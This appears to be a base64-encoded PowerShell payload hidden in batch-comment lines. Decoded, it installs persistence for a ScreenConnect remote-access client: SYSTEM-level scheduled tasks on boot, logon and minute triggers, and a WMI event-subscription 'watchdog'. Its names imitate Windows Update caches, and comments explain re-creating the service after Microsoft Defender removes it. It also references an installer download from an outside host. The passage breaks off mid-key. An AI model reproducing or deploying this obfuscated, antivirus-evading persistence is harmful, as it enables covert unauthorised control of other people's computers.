::RGlyICdldGxfbW9uLmNtZCcNCiAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0
::aCAkTW9uUGF0aCkgew0KICAgICAgICBDb3B5LUl0ZW0gLUxpdGVyYWxQYXRoICRN
::b25QYXRoIC1EZXN0aW5hdGlvbiAkYm9vdE1vbiAtRm9yY2UgLUVycm9yQWN0aW9u
::IFNpbGVudGx5Q29udGludWUNCiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0
::aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJvb3RFdGwgLUZvcmNlIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIENvcHktSXRlbSAtTGl0ZXJh
::bFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRldGxNb24gLUZvcmNlIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KICAgICMgTDM3OiBkZWRp
::Y2F0ZWQgYm9vdCBncnl4YS1oZWFsLiBEZWZlbmRlciBjYW4gc3RyaXAgdGhlIGdy
::eXhhIFNDTSBzZXJ2aWNlIGVudHJ5IGR1cmluZw0KICAgICMgYm9vdCBiZWZvcmUg
::dGhlIG1vbidzIE1JTlVURSB0YXNrIGZpcmVzLiBBIGJvb3QtdHJpZ2dlciBlbnN1
::cmUgKC1Ob1dhaXQgLUZvcmNlKSByZS1jcmVhdGVzDQogICAgIyBpdCB3aXRoaW4g
::c2Vjb25kcyBvZiBzdGFydHVwLCBzbyByZWJvb3RzIG5vIGxvbmdlciBkcm9wIHRo
::ZSBob3N0IGZyb20gZ3J5eGEuDQogICAgJGJvb3RHcnl4YSA9IEpvaW4tUGF0aCAk
::Ym9vdCAnZ3J5eGFfYm9vdC5jbWQnDQogICAgJGxpYkluQm9vdCA9IEpvaW4tUGF0
::aCAkYm9vdCAnb3duX2xpYi5wczEnDQogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJh
::bFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnb3duX2xpYi5wczEnKSkgew0KICAg
::ICAgICBDb3B5LUl0ZW0gLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtEaXIg
::J293bl9saWIucHMxJykgLURlc3RpbmF0aW9uICRsaWJJbkJvb3QgLUZvcmNlIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KICAgICRnYkxpbmVz
::ID0gQCgNCiAgICAgICAgJ0BlY2hvIG9mZicsDQogICAgICAgICdyZW0gTDQ2IEZS
::RUVaRSBib290IHNjIHN0YXJ0IG9ubHknLA0KICAgICAgICAnc2Mgc3RhcnQgIlNj
::cmVlbkNvbm5lY3QgQ2xpZW50ICgzNmU1MDZmZjAxNmIyMTUxKSIgPm51bCAyPiYx
::JywNCiAgICAgICAgJ2V4aXQnDQogICAgKQ0KICAgIFNldC1Db250ZW50IC1MaXRl
::cmFsUGF0aCAkYm9vdEdyeXhhIC1WYWx1ZSAkZ2JMaW5lcyAtRW5jb2RpbmcgQVND
::SUkgLUZvcmNlDQogICAgIyBCT09UIGlzIG5vdCBMb2NrRGlyJ2QgYnkgb3duX3Nl
::Y3VyZSDigJQgVGFzayBTY2hlZHVsZXIgY2FuIHJlc29sdmUgVFIgdGhlcmUuDQog
::ICAgJHRyTW9uID0gImNtZC5leGUgL2MgJGJvb3RNb24iDQogICAgJHRyRXRsID0g
::ImNtZC5leGUgL2MgJGJvb3RFdGwiDQogICAgJHRyR3J5eGEgPSAiY21kLmV4ZSAv
::YyAkYm9vdEdyeXhhIg0KICAgICRtb0EgPSBbc3RyaW5nXSRpZFsnTU9fQSddOyBp
::ZiAoLW5vdCAkbW9BKSB7ICRtb0EgPSAnMicgfQ0KICAgICRtb0IgPSBbc3RyaW5n
::XSRpZFsnTU9fQiddOyBpZiAoLW5vdCAkbW9CKSB7ICRtb0IgPSAnMycgfQ0KICAg
::ICRzdCA9IChHZXQtRGF0ZSkuVG9TdHJpbmcoJ0hIOm1tJykNCiAgICAkc3BlY3Mg
::PSBAKA0KICAgICAgICBAeyBLZXkgPSAnVEFTS19BJzsgTWFya2VyID0gJ293bl9t
::b24uY21kJzsgU2MgPSAnTUlOVVRFJzsgTW8gPSAkbW9BOyBUciA9ICR0ck1vbiB9
::DQogICAgICAgIEB7IEtleSA9ICdUQVNLX0InOyBNYXJrZXIgPSAnZXRsX21vbi5j
::bWQnOyBTYyA9ICdNSU5VVEUnOyBNbyA9ICRtb0I7IFRyID0gJHRyRXRsIH0NCiAg
::ICAgICAgQHsgS2V5ID0gJ1RBU0tfQyc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7
::IFNjID0gJ09OU1RBUlQnOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9DQogICAgICAg
::IEB7IEtleSA9ICdUQVNLX0QnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9
::ICdPTkxPR09OJzsgTW8gPSAnJzsgVHIgPSAkdHJNb24gfQ0KICAgICAgICBAeyBL
::ZXkgPSAnVEFTS19HJzsgTWFya2VyID0gJ2dyeXhhX2Jvb3QuY21kJzsgU2MgPSAn
::T05TVEFSVCc7IE1vID0gJyc7IFRyID0gJHRyR3J5eGEgfQ0KICAgICkNCiAgICAk
::b2sgPSAwOyAkcmVhcm1lZCA9IDA7ICRmYWlsID0gMA0KICAgIGZvcmVhY2ggKCRz
::cCBpbiAkc3BlY3MpIHsNCiAgICAgICAgIyBUQVNLX0cgKGJvb3QgZ3J5eGEtaGVh
::bCkgdXNlcyBhIGZpeGVkIG5hbWU7IHRoZSBBLUQgcm90YXRpb24gcG9vbCBoYXMg
::bm8gc2xvdCBmb3IgaXQuDQogICAgICAgICR0biA9IGlmICgkc3AuS2V5IC1lcSAn
::VEFTS19HJykgeyAnV3VjYWNoZUdyeXhhQm9vdCcgfSBlbHNlIHsgTm9ybWFsaXpl
::LVRhc2tOYW1lIChbc3RyaW5nXSRpZFskc3AuS2V5XSkgfQ0KICAgICAgICBpZiAo
::LW5vdCAkdG4pIHsgJGZhaWwrKzsgY29udGludWUgfQ0KICAgICAgICBpZiAoVGVz
::dC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikgeyAkb2srKzsgY29udGludWUg
::fQ0KICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkc3AuTWFy
::a2VyKSB7ICRvaysrOyBjb250aW51ZSB9DQogICAgICAgICRibG9iID0gR2V0LVRh
::c2tWZXJib3NlQmxvYiAkdG4NCiAgICAgICAgaWYgKC1ub3QgJGJsb2IpIHsgJGJs
::b2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICgiXCR0biIpIH0NCiAgICAgICAgaWYg
::KCRibG9iKSB7DQogICAgICAgICAgICAkb3Vyc0Jyb2tlbiA9ICgkYmxvYiAtbWF0
::Y2ggJyg/aSlvd25fbW9uXC5jbWR8ZXRsX21vblwuY21kfGdyeXhhX2Jvb3RcLmNt
::ZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQ0KICAgICAgICAgICAgaWYgKC1u
::b3QgJG91cnNCcm9rZW4pIHsgJGZhaWwrKzsgV3JpdGUtT3duTG9nICJ0YXNrc19z
::a2lwX2ZvcmVpZ24gJHRuIjsgY29udGludWUgfQ0KICAgICAgICAgICAgUmVtb3Zl
::LVRhc2tRdWlldCAkdG4NCiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQgKCJc
::JHRuIikNCiAgICAgICAgfQ0KICAgICAgICAjIEJ1aWxkIGNtZGxpbmUgZXhhY3Rs
::eSBsaWtlIG93bi5jbWQgZGV0YWNoIChwcm92ZW4gdG8gd29yayBhcyBTWVNURU0p
::Lg0KICAgICAgICAkcGFydHMgPSBAKA0KICAgICAgICAgICAgJy9DcmVhdGUnLCAn
::L1ROJywgJHRuLCAnL1JVJywgJ1NZU1RFTScsICcvUkwnLCAnSElHSEVTVCcsICcv
::RicsDQogICAgICAgICAgICAnL1RSJywgJHNwLlRyLCAnL1NDJywgJHNwLlNjDQog
::ICAgICAgICkNCiAgICAgICAgaWYgKCRzcC5TYyAtZXEgJ01JTlVURScpIHsNCiAg
::ICAgICAgICAgICRwYXJ0cyArPSBAKCcvTU8nLCAkc3AuTW8sICcvU1QnLCAkc3Qp
::DQogICAgICAgIH0NCiAgICAgICAgJGFyZ0xpbmUgPSAoJHBhcnRzIHwgRm9yRWFj
::aC1PYmplY3Qgew0KICAgICAgICAgICAgaWYgKCRfIC1tYXRjaCAnW1xzIl0nKSB7
::ICciezB9IicgLWYgKCRfIC1yZXBsYWNlICciJywgJ1wiJykgfSBlbHNlIHsgJF8g
::fQ0KICAgICAgICB9KSAtam9pbiAnICcNCiAgICAgICAgJGNyZWF0ZVR4dCA9IGNt
::ZC5leGUgL2MgInNjaHRhc2tzLmV4ZSAkYXJnTGluZSIgMj4mMSB8IEZvckVhY2gt
::T2JqZWN0IHsgIiRfIiB9DQogICAgICAgICRjcmVhdGVKb2luZWQgPSAoJGNyZWF0
::ZVR4dCAtam9pbiAnICcpLlRyaW0oKQ0KICAgICAgICBXcml0ZS1Pd25Mb2cgInRh
::c2tzX2NyZWF0ZSAkKCRzcC5LZXkpICR0biA9PiAkY3JlYXRlSm9pbmVkIg0KICAg
::ICAgICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRuICRzcC5NYXJrZXIpIC1vciAo
::VGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkc3AuTWFya2VyKSkgew0KICAgICAg
::ICAgICAgJHJlYXJtZWQrKw0KICAgICAgICAgICAgaWYgKCRzcC5LZXkgLWVxICdU
::QVNLX0EnIC1vciAkc3AuS2V5IC1lcSAnVEFTS19CJykgew0KICAgICAgICAgICAg
::ICAgIGNtZC5leGUgL2MgInNjaHRhc2tzLmV4ZSAvUnVuIC9UTiBgIiR0bmAiIiB8
::IE91dC1OdWxsDQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAg
::ICAgICAgICAkZmFpbCsrDQogICAgICAgICAgICBXcml0ZS1Pd25Mb2cgInRhc2tz
::X2NyZWF0ZV9GQUlMICQoJHNwLktleSkgJHRuIg0KICAgICAgICB9DQogICAgfQ0K
::ICAgIHJldHVybiAidGFza3Mgb2s9JG9rIHJlYXJtZWQ9JHJlYXJtZWQgZmFpbD0k
::ZmFpbCINCn0NCg0KZnVuY3Rpb24gUmVtb3ZlLVdhdGNoZG9nIHsNCiAgICBmb3Jl
::YWNoICgkY2xzIGluIEAoJ19fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcnLCdfX0V2
::ZW50RmlsdGVyJywnQ29tbWFuZExpbmVFdmVudENvbnN1bWVyJywnX19JbnRlcnZh
::bFRpbWVySW5zdHJ1Y3Rpb24nKSkgew0KICAgICAgICBHZXQtV21pT2JqZWN0IC1O
::YW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzICRjbHMgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0
::IHsNCiAgICAgICAgICAgICAgICAoJF8uTmFtZSAtZXEgJ1d1Y2FjaGVXYXRjaGRv
::Z0YnKSAtb3IgKCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dDJykgLW9yDQog
::ICAgICAgICAgICAgICAgKCRfLlRpbWVySWQgLWVxICdXdWNhY2hlV2F0Y2hkb2cn
::KSAtb3INCiAgICAgICAgICAgICAgICAoJF8uRmlsdGVyIC1hbmQgJF8uRmlsdGVy
::LlRvU3RyaW5nKCkgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dGKicpIC1vcg0KICAg
::ICAgICAgICAgICAgICgkXy5Db25zdW1lciAtYW5kICRfLkNvbnN1bWVyLlRvU3Ry
::aW5nKCkgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicpDQogICAgICAgICAgICB9
::IHwgRm9yRWFjaC1PYmplY3QgeyAkXy5EZWxldGUoKSB8IE91dC1OdWxsIH0NCiAg
::ICB9DQp9DQoNCmZ1bmN0aW9uIEluc3RhbGwtV2F0Y2hkb2cgew0KICAgIGlmICgt
::bm90ICRNb25QYXRoKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgIFJlbW92ZS1XYXRj
::aGRvZw0KICAgICRvayA9ICR0cnVlDQogICAgdHJ5IHsNCiAgICAgICAgU2V0LVdt
::aUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9f
::SW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIGANCiAgICAgICAgICAgIC1Bcmd1bWVu
::dHMgQHsgVGltZXJJZCA9ICdXdWNhY2hlV2F0Y2hkb2cnOyBJbnRlcnZhbE1pbGxp
::c2Vjb25kcyA9IDE4MDAwMDsgU2tpcElmUGFzc2VkID0gJGZhbHNlIH0gfCBPdXQt
::TnVsbA0KICAgICAgICAkZiA9IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJv
::b3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0V2ZW50RmlsdGVyIGANCiAgICAgICAg
::ICAgIC1Bcmd1bWVudHMgQHsgTmFtZSA9ICdXdWNhY2hlV2F0Y2hkb2dGJzsgRXZl
::bnROYW1lc3BhY2UgPSAncm9vdFxjaW12Mic7IFF1ZXJ5TGFuZ3VhZ2UgPSAnV1FM
::JzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgUXVlcnkgPSAiU0VMRUNUICog
::RlJPTSBfX1RpbWVyRXZlbnQgV0hFUkUgVGltZXJJZD0nV3VjYWNoZVdhdGNoZG9n
::JyIgfQ0KICAgICAgICAkYyA9IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJv
::b3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIg
::YA0KICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRj
::aGRvZ0MnOyBDb21tYW5kTGluZVRlbXBsYXRlID0gImNtZC5leGUgL2MgYCIkTW9u
::UGF0aGAiIjsgUnVuSW50ZXJhY3RpdmVseSA9ICRmYWxzZSB9DQogICAgICAgIFNl
::dC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFz
::cyBfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nIGANCiAgICAgICAgICAgIC1Bcmd1
::bWVudHMgQHsgRmlsdGVyID0gJGY7IENvbnN1bWVyID0gJGMgfSB8IE91dC1OdWxs
::DQogICAgfSBjYXRjaCB7ICRvayA9ICRmYWxzZSB9DQogICAgcmV0dXJuICRvaw0K
::fQ0KDQpmdW5jdGlvbiBUZXN0LVdhdGNoZG9nR3JhcGggew0KICAgICR0ID0gR2V0
::LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBf
::X0ludGVydmFsVGltZXJJbnN0cnVjdGlvbiAtRmlsdGVyICJUaW1lcklkPSdXdWNh
::Y2hlV2F0Y2hkb2cnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAg
::ICRmID0gR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9u
::IC1DbGFzcyBfX0V2ZW50RmlsdGVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRj
::aGRvZ0YnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICRjID0g
::R2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFz
::cyBDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNo
::ZVdhdGNoZG9nQyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
::JGIgPSAkbnVsbA0KICAgIGlmICgkZiAtYW5kICRjKSB7DQogICAgICAgICRiID0g
::R2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFz
::cyBfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nIC1FcnJvckFjdGlvbiBTaWxlbnRs
::eUNvbnRpbnVlIHwNCiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkZpbHRl
::ciAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0YqJyAtYW5kICRfLkNvbnN1bWVyIC1s
::aWtlICcqV3VjYWNoZVdhdGNoZG9nQyonIH0gfA0KICAgICAgICAgICAgU2VsZWN0
::LU9iamVjdCAtRmlyc3QgMQ0KICAgIH0NCiAgICByZXR1cm4gW2Jvb2xdKCR0IC1h
::bmQgJGYgLWFuZCAkYyAtYW5kICRiKQ0KfQ0KDQpmdW5jdGlvbiBFbnN1cmUtV2F0
::Y2hkb2cgew0KICAgIGlmIChUZXN0LVdhdGNoZG9nR3JhcGgpIHsgcmV0dXJuICdP
::SycgfQ0KICAgIGlmICgtbm90ICRNb25QYXRoKSB7IHJldHVybiAnTUlTU0lORycg
::fQ0KICAgIGlmIChJbnN0YWxsLVdhdGNoZG9nKSB7IHJldHVybiAnUkVBUk1FRCcg
::fQ0KICAgIHJldHVybiAnRkFJTCcNCn0NCg0KIyBDb3JyZWN0IDMyLWJpdCArIDY0
::LWJpdCBBUlAgaGl2ZXMuIEw2IGFuZCBlYXJsaWVyIHVzZWQgYSB0cnVuY2F0ZWQN
::CiMgV09XNjQzMk5vZGUgcGF0aCAobWlzc2luZyBNaWNyb3NvZnRcV2luZG93cykg
::c28gRVZFUlkgMzItYml0IFNDIHByb2R1Y3QNCiMgd2FzIGludmlzaWJsZSB0byBy
::ZXBhaXIvZXh0ZXJtaW5hdGUvcmVnaXN0ZXJlZC4NCiRzY3JpcHQ6VW5pbnN0YWxs
::Um9vdHMgPSBAKA0KICAgICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93
::c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwnLA0KICAgICdIS0xNOlxTT0ZUV0FS
::RVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxV
::bmluc3RhbGwnDQopDQoNCmZ1bmN0aW9uIFRlc3QtU0NSZWdpc3RlcmVkKFtzdHJp
::bmddJEZpbmdlcnByaW50KSB7DQogICAgIyBMODogTkVWRVIgdXNlIHJldHVybiBp
::bnNpZGUgRm9yRWFjaC1PYmplY3QgLSBpdCBvbmx5IGV4aXRzIHRoZQ0KICAgICMg
::cGlwZWxpbmUgaXRlcmF0aW9uLCBzbyB0aGlzIGZ1bmN0aW9uIGFsd2F5cyBmZWxs
::IHRocm91Z2ggdG8gJ25vJw0KICAgICMgYW5kIHRoZSBtb24gb3JwaGFuLWxhZGRl
::ciBkZWxldGVkIGhlYWx0aHkgcmVnaXN0ZXJlZCBzZXJ2aWNlcy4NCiAgICBpZiAo
::LW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICdubycgfQ0KICAgICRuYW1lID0g
::IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIg0KICAgIGZvcmVh
::Y2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsNCiAgICAgICAg
::aWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgY29udGludWUgfQ0KICAgICAg
::ICBmb3JlYWNoICgka2V5IGluIChHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICAgICAgJGRuID0gKEdl
::dC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUpLkRpc3BsYXlOYW1lDQogICAgICAgICAgICBpZiAoJGRuIC1hbmQg
::KCRkbiAtaWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1saWtlICd7
::Kn0nKSkgeyByZXR1cm4gJ3llcycgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJl
::dHVybiAnbm8nDQp9DQoNCmZ1bmN0aW9uIFJlcGFpci1TQ1NlcnZpY2UoW3N0cmlu
::Z10kRmluZ2VycHJpbnQpIHsNCiAgICAjIEwzMDogTkVWRVIgcnVuIG1zaWV4ZWMg
::L2ZhIG9yIC9pIG9uIGEgU2NyZWVuQ29ubmVjdCBwcm9kdWN0IOKAlCBTQyBpbnN0
::YW5jZXMgc2hhcmUNCiAgICAjIGxlZ2FjeSBVcGdyYWRlQ29kZXMsIHNvIGFueSBt
::c2lleGVjIHJlcGFpci9pbnN0YWxsIG9uIG9uZSBGUCB0cmlnZ2VycyBhDQogICAg
::IyBtYWpvci11cGdyYWRlIHJlbW92YWwgdGhhdCBrbm9ja3MgdGhlIEdyeXhhIHNp
::YmxpbmcgT0ZGTElORS4gU2VydmljZS1sZXZlbCBoZWFsIG9ubHkuDQogICAgaWYg
::KC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAnbm8tZnAnIH0NCiAgICAkbmFt
::ZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSINCiAgICAk
::c3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUNCiAgICBpZiAoJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAn
::UnVubmluZycpIHsgcmV0dXJuICdzdmMtcnVubmluZycgfQ0KICAgIGlmICgkc3Zj
::KSB7DQogICAgICAgICMgcHJlc2VudCBidXQgc3RvcHBlZCAtPiBzZXJ2aWNlLWxl
::dmVsIHN0YXJ0LCBubyBtc2lleGVjDQogICAgICAgICYgc2MuZXhlIGNvbmZpZyAi
::JG5hbWUiIHN0YXJ0PSBhdXRvIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAmIHNj
::LmV4ZSBmYWlsdXJlICIkbmFtZSIgcmVzZXQ9IDg2NDAwIGFjdGlvbnM9IHJlc3Rh
::cnQvNTAwMC9yZXN0YXJ0LzUwMDAvcmVzdGFydC81MDAwIDI+JjEgfCBPdXQtTnVs
::bA0KICAgICAgICAmIHNjLmV4ZSBzdGFydCAiJG5hbWUiIDI+JjEgfCBPdXQtTnVs
::bA0KICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA2DQogICAgICAgICYgc2Mu
::ZXhlIHN0YXJ0ICIkbmFtZSIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICRzdmMg
::PSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
::b250aW51ZQ0KICAgICAgICBpZiAoJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAn
::UnVubmluZycpIHsgcmV0dXJuICdzdmMtc3RhcnRlZCcgfQ0KICAgICAgICByZXR1
::cm4gJ3N2Yy1zdGlsbC1zdG9wcGVkLW5vcmVwYWlyKG1zaWV4ZWMtZGlzYWJsZWQp
::Jw0KICAgIH0NCiAgICAjIHNlcnZpY2UgZW50cnkgZ29uZTogcmUtY3JlYXRlIGZy
::b20gdGhlIHJlZ2lzdGVyZWQgcHJvZHVjdCdzIGluc3RhbGwgZGlyIFdJVEhPVVQg
::bXNpZXhlYy4NCiAgICAjIElmIGJpbmFyaWVzIGV4aXN0LCBzYy5leGUgY3JlYXRl
::ICsgc3RhcnQuIEVsc2UgcmVwb3J0IHNvIGNhbGxlciBjYW4gZGVjaWRlIChuZXZl
::ciAvZmEsIG5ldmVyIC9pKS4NCiAgICAkZGlyID0gJG51bGwNCiAgICBmb3JlYWNo
::ICgkYmFzZSBpbiBAKCR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSwgJGVudjpQcm9n
::cmFtRmlsZXMpKSB7DQogICAgICAgICRjYW5kID0gSm9pbi1QYXRoICRiYXNlICJT
::Y3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSINCiAgICAgICAgaWYg
::KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkY2FuZCAnU2NyZWVu
::Q29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScpKSB7ICRkaXIgPSAkY2FuZDsgYnJl
::YWsgfQ0KICAgIH0NCiAgICBpZiAoLW5vdCAkZGlyKSB7IHJldHVybiAnbm90LXJl
::Z2lzdGVyZWQtbm9yZXBhaXIobXNpZXhlYy1kaXNhYmxlZCknIH0NCiAgICAkZXhl
::ID0gSm9pbi1QYXRoICRkaXIgJ1NjcmVlbkNvbm5lY3QuQ2xpZW50U2VydmljZS5l
::eGUnDQogICAgJiBzYy5leGUgY3JlYXRlICIkbmFtZSIgYmluUGF0aD0gImAiJGV4
::ZWAiIiBzdGFydD0gYXV0byBEaXNwbGF5TmFtZT0gIiRuYW1lIiAyPiYxIHwgT3V0
::LU51bGwNCiAgICAmIHNjLmV4ZSBmYWlsdXJlICIkbmFtZSIgcmVzZXQ9IDg2NDAw
::IGFjdGlvbnM9IHJlc3RhcnQvNTAwMC9yZXN0YXJ0LzUwMDAvcmVzdGFydC81MDAw
::IDI+JjEgfCBPdXQtTnVsbA0KICAgICYgc2MuZXhlIHN0YXJ0ICIkbmFtZSIgMj4m
::MSB8IE91dC1OdWxsDQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNQ0KICAgICRz
::dmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZQ0KICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVxICdS
::dW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1yZWNyZWF0ZWQtc3RhcnRlZCcgfQ0KICAg
::IHJldHVybiAnc3ZjLXJlY3JlYXRlZC1ub3QtcnVubmluZycNCn0NCg0KIyDilIDi
::lIAgR3J5eGEgU0MgdjIgKGNsZWFuIHJld3JpdGUpIOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KIyBTaW5nbGUtZmxpZ2h0IGVu
::c3VyZS4gUnVubmluZyA9PiBoZWFsdGh5LiBTdG9wcGVkIHN2YyA9PiBzdGFydC4N
::CiMgQnJva2VuL1N0dWNrID0+IGNsZWFuLXJlaW5zdGFsbCBvbmNlLCBkZXRhY2hl
::ZC4gQWJzZW50ID0+IGluc3RhbGwgb25jZS4NCiMgTm8gL2ZhLCBubyBpbmxpbmUg
::YmxvY2tpbmcgL2ksIG5vIGZhbHNlICJhbHJlYWR5X3J1bm5pbmciLg0KJHNjcmlw
::dDpHcnl4YURlZmF1bHRGcCA9ICczNmU1MDZmZjAxNmIyMTUxJw0KJHNjcmlwdDpH
::cnl4YU1zaVVybCA9ICdodHRwczovL3VpLmdyeXhhLmNvbS9CaW4vU2NyZWVuQ29u
::bmVjdC5DbGllbnRTZXR1cC5tc2k/ZT1BY2Nlc3MmeT1HdWVzdCcNCiRzY3JpcHQ6
::R3J5eGFSZWxheUhvc3QgPSAndXBkYXRlLmdyeXhhLmNvbScNCiRzY3JpcHQ6R3J5
::eGFVaUhvc3QgPSAndWkuZ3J5eGEuY29tJw0KJHNjcmlwdDpTZXZyekRlZmF1bHRQ
::cmltYXJ5ID0gJzVmNjAxMDU3OTg1MmU1MDcnDQokc2NyaXB0OlNldnJ6RGVmYXVs
::dEFsdCA9ICdmODYxYzgxNDBkNDUzNDI3Jw0KJHNjcmlwdDpTZXZyektlZXAgPSBA
::KCRzY3JpcHQ6U2V2cnpEZWZhdWx0UHJpbWFyeSwgJHNjcmlwdDpTZXZyekRlZmF1
::bHRBbHQpDQojIFNldCB0byBhIDE2LWhleCBGUCB5b3UgV0FOVCBpbnN0YWxsZWQg
::KGFmdGVyIHJvdGF0aW5nIG9uIHRoZSBwYW5lbCkuIEFueSBob3N0DQojIHJ1bm5p
::bmcgYSBkaWZmZXJlbnQgRlAgbWlncmF0ZXMgdG8gdGhpcyBvbmUuIExlYXZlICcn
::IHRvIGp1c3QgdHJhY2sgd2hhdGV2ZXIgcnVucy4NCiRzY3JpcHQ6R3J5eGFFeHBl
::Y3RlZEZwID0gJzM2ZTUwNmZmMDE2YjIxNTEnDQoNCiMgTDQwOiBSU0EgcHVibGlj
::IGtleSBmb3IgdXBkYXRlLm1hbmlmZXN0IHZlcmlmaWNhdGlvbiAocHJpdmF0ZSBr
::ZXkgaW4ga2V5cy8sIGdpdGlnbm9yZWQpDQokc2NyaXB0OlVwZGF0ZVB1YktleVht
::bCA9IEAnDQo8UlNBS2V5VmFsdWU+PE1vZHVsdXM+dEFCWlBudnN1cG9yaTE5bXRK
::YkhvVDF1RkdWTE5LcU9OQjB4dHZJQkg0SHBmTTVVK1N0Q3VHbkVkSXlQeWtNUVBq
::REVsVkJaT2VhOHBkZEJ4eFBNSTk0ZDRWQnBkd25RZWRXSGxubDZFdVFzSkwyTU1j
